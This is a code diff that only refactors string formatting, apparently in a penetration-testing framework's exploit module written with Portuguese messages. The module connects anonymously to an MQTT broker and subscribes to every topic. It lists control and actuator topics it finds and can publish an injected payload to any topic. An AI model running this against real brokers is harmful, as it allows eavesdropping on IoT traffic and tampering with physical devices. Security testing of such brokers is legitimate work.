@@ -160,7 +160,7 @@ class Exploit(Exploit):
         rem = self._decode_remaining_length(sock)
         suback = sock.recv(rem)
         if len(suback) >= 3 and suback[2] == 0x80:
-            raise PermissionError("Subscrição a '{}' rejeitada pelo broker".format(topic))
+            raise PermissionError(f"Subscrição a '{topic}' rejeitada pelo broker")
         return suback[2] if len(suback) >= 3 else 0
 
     def _read_publish_messages(self, sock, duration):
@@ -252,23 +252,22 @@ class Exploit(Exploit):
         sock = None
         try:
             tls_label = " (TLS)" if self.use_tls else ""
-            print_status("Conectando a {}:{}{} sem credenciais...".format(
-                self.target, self.port, tls_label))
+            print_status(f"Conectando a {self.target}:{self.port}{tls_label} sem credenciais...")
 
             sock = self._create_socket()
             sock.connect((str(self.target), int(self.port)))
             rc = self._mqtt_connect(sock)
 
             if rc != 0:
-                print_error("Broker rejeitou conexão anônima (CONNACK code: {})".format(rc))
+                print_error(f"Broker rejeitou conexão anônima (CONNACK code: {rc})")
                 return
 
             print_success("Conexão anônima aceita (CONNACK rc=0)")
             print_status("Subscrevendo a '#' (todos os tópicos)...")
             granted_qos = self._mqtt_subscribe(sock, topic="#", packet_id=1)
-            print_success("Subscrição confirmada (QoS concedido: {})".format(granted_qos))
+            print_success(f"Subscrição confirmada (QoS concedido: {granted_qos})")
 
-            print_status("Escutando mensagens ({} segundos)...".format(self.listen_duration))
+            print_status(f"Escutando mensagens ({self.listen_duration} segundos)...")
             ka_thread = threading.Thread(
                 target=self._keepalive_loop,
                 args=(sock, int(self.listen_duration)),
@@ -280,7 +279,7 @@ class Exploit(Exploit):
             if not messages:
                 print_warning("Nenhuma mensagem recebida na janela de escuta")
             else:
-                print_info("Mensagens em {} tópico(s) distinto(s)".format(len(messages)))
+                print_info(f"Mensagens em {len(messages)} tópico(s) distinto(s)")
 
             headers = ["Tópico", "Msgs", "QoS", "Classe", "Payload (amostra)"]
             rows = []
@@ -299,19 +298,17 @@ class Exploit(Exploit):
                 print_table(headers, *rows)
 
             if control_topics:
-                print_warning("{} tópico(s) de controle/atuador identificado(s):".format(
-                    len(control_topics)))
+                print_warning(f"{len(control_topics)} tópico(s) de controle/atuador identificado(s):")
                 for ct in control_topics:
-                    print_warning("  -> {}".format(ct))
+                    print_warning(f"  -> {ct}")
 
             inject_topic = str(self.inject_topic).strip()
             inject_payload = str(self.inject_payload).strip()
 
             if inject_topic and inject_payload:
-                print_status("Publicando em '{}' ...".format(inject_topic))
+                print_status(f"Publicando em '{inject_topic}' ...")
                 sock.sendall(self._build_publish_packet(inject_topic, inject_payload, qos=0))
-                print_success("Payload publicado: '{}' -> '{}'".format(
-                    inject_topic, inject_payload[:80]))
+                print_success(f"Payload publicado: '{inject_topic}' -> '{inject_payload[:80]}'")
             elif inject_topic and not inject_payload:
                 print_warning("inject_topic definido mas inject_payload está vazio; ignorando")
 
@@ -327,9 +324,9 @@ class Exploit(Exploit):
         except PermissionError as exc:
             print_error(str(exc))
         except (socket.timeout, OSError) as exc:
-            print_error("Erro de conexão: {}".format(exc))
+            print_error(f"Erro de conexão: {exc}")
         except ConnectionError as exc:
-            print_error("Erro de protocolo: {}".format(exc))
+            print_error(f"Erro de protocolo: {exc}")
         finally:
             if sock:
                 try:
